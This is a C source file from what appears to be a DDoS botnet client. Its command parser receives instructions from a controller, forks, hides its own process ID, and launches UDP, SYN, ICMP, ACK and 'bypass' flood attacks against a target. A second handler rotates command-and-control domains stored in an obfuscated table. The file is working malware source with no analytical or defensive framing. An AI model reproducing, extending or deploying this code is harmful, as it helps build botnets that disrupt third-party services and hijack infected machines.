#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/prctl.h>

#include "dbg.h"
#include "hide.h"
#include "floods.h"
#include "table.h"

#define DOMAINS_M 5

void command_parser(char *buf) {

    int argc = 0;
    char *token = strtok(buf, " "), *argv[8] = {0};

    while (token && argc < 8) {
        argv[argc++] = token;
        token = strtok(NULL, " ");
    }

    if (argc != 8)
        return;

#ifdef DEBUG
    for (int i = 0; i < argc; i++)
        DEBUG_PRINT("[command_parser] argv[%d]: (\"%s\")\n", i, argv[i]);
#endif

    if (fork() != 0)
        return;

    prctl(PR_SET_PDEATHSIG, SIGKILL);
    hide_pid();

    char *payload = *argv[7] == '(' ? NULL : argv[7];

    if (*argv[0] == '0')
        udp_flood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]), atoi(argv[6]), payload);
    else if (*argv[0] == '1')
        syn_flood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]), atoi(argv[6]), payload);
    else if (*argv[0] == '2')
        psh_ack_flood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]), atoi(argv[6]), payload);
    else if (*argv[0] == '3')
        icmp_flood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]), atoi(argv[6]), payload);
    else if (*argv[0] == '4')
        tcpbypass_flood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]), atoi(argv[6]), payload);
    else if (*argv[0] == '5')
        udpbypass_flood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]), atoi(argv[6]), payload);
    else if (*argv[0] == '6')
        ack_flood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]), atoi(argv[6]), payload);

    exit(0);
}

/*

void updatedornop(void) {

    for (int i = TABLE_REG_DOMAIN; i <= TABLE_BINS_DOMAIN; i++) {
        if (table[i].str == NULL || table[i].len == 0)
            continue;

        table_unlock_val(i);

        printf("table[%d] = \"%s\"\n", i, table[i].str);

        table_lock_val(i);
    }
}

*/

void rot_table(uint8_t id, const char *dom) {

    table_unlock_val(id);  //  previous in tab

    if (table[id].str != NULL) {
    
        memset(table[id].str, 0, table[id].len);
        free(table[id].str);
        
        table[id].str = NULL;
        table[id].len = 0;
    }

    size_t new_len = strlen(dom);
    table[id].str = calloc(new_len + 1, sizeof(char));
    memcpy(table[id].str, dom, new_len);
    
    table[id].len = new_len;
    table_lock_val(id);
}

void dyn_parse(char *buf) {

    DEBUG_PRINT("I got called");

    int argc = 0;
    char *argv[8] = {0};
    char *token = strtok(buf, " ");

    while (token && argc < 8) {
    
        argv[argc++] = token;
        token = strtok(NULL, " ");
    }

    if (argc != 6 || strcmp(argv[0], "ud") != 0)
        return;

    for (int i = 0; i < DOMAINS_M; i++) { //  clear from tab
    
        rot_table(TABLE_REG_DOMAIN + i, "");
    }

    for (int i = 1; i <= DOMAINS_M; i++) { //  add new doms
    
        rot_table(TABLE_REG_DOMAIN + (i - 1), argv[i]); 
    }

    for (int i = 0; i < argc; i++) {
    
        DEBUG_PRINT("[dyn_parse] argv[%d]: \"%s\"\n", i, argv[i]);
    }
    
}
